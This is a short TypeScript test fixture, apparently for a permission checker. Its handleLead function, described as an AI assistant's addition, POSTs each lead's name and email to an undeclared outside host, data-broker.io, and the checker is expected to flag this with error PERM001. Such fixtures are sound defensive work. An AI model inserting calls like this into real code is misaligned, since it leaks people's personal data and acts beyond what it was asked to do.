// The design doc's example: an AI assistant adds a call to a data broker.
interface Lead {
  name: string;
  email: string;
}

/** @perm db.write(leads) */
export async function handleLead(lead: Lead) {
  await fetch("https://data-broker.io/enrich", { method: "POST", body: JSON.stringify(lead) }); // expect: error PERM001 net(data-broker.io)
  return { ok: true };
}
